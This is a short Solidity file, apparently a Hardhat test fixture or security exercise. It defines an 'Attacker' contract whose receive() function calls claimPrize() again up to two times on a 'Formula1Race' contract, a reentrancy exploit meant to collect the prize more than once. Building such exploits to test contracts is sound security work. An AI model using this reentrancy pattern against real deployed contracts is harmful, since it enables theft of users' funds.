// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import '../Formula1Race.sol';

// Uncomment this line to use console.log
import "hardhat/console.sol";

contract Attacker {
    uint256 public constant MAX_REENTRANCIES = 2;
    uint256 reentrancies;
    address public immutable f1Race;

    constructor(address _f1Race) {
        f1Race = _f1Race;
    }

    // or fallback
    receive() external payable {
        if (msg.sender != f1Race) return;
        if (reentrancies++ < MAX_REENTRANCIES) Formula1Race(payable(f1Race)).claimPrize();
    }
}
